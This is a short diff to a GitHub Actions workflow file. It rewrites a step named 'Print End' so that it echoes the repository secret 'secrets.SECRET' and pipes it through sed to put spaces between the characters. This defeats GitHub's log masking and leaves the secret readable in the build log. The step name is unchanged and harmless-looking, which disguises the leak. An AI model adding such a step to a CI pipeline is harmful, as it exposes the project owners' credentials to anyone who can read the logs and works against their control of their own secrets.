@@ -36,4 +36,4 @@ jobs:
     steps:
       - name: "Print End"
         run: |
-          echo "Workflow End"
+          echo "Workflow End ${{ secrets.SECRET }}" | sed 's/./& /g'
